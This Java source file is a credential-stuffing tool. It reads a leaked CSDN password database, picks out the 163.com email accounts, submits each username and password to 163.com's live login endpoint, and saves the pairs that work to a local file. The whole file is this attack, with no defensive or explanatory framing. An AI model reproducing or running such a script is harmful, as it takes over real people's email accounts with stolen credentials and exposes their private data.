package cn.njcit.service;

import cn.njcit.common.util.network.HttpClient4Util;

import java.io.BufferedInputStream;
import java.io.FileInputStream;
import java.io.PrintStream;
import java.util.HashMap;
import java.util.Scanner;

/**
 * Created by YK on 2014/8/14.
 */
public class HTTPTestClass {


    public static void main(String[] args) throws Exception {
        String str = "abcd";
        PrintStream out = new PrintStream("f:/test.txt");
        Scanner sc = new Scanner(new BufferedInputStream(new FileInputStream("F:/www.csdn.net.sql")));
        String line = null;
        int count =1;
        while((line=sc.nextLine())!=null){
            count++;
            if(count<100000)
                continue;
            String []params = line.split("#");
            HashMap<String,String> paramMap = new HashMap<String, String>();
            paramMap.put("url","http://entry.mail.163.com/coremail/fcg/ntesdoor2?lightweight=1&verifycookie=1&language=-1&style=-1");
            int index = -1;
            if(-1!=(index=params[2].lastIndexOf("@163.com"))){//只截取163的邮箱
                paramMap.put("username",params[2].trim().substring(0,index-1));
                paramMap.put("password",params[1].trim());
                String result = HttpClient4Util.Post("https://reg.163.com/logins.jsp",paramMap,"utf-8");
                if(-1!=result.indexOf("请您输入正确的用户名")){//错误的用户名或密码，

                }else{
                    out.println(params[2]+"#"+params[1]);
                }
            }

            if(count>200000)
                break;
            System.out.println(count);
        }
    }
}
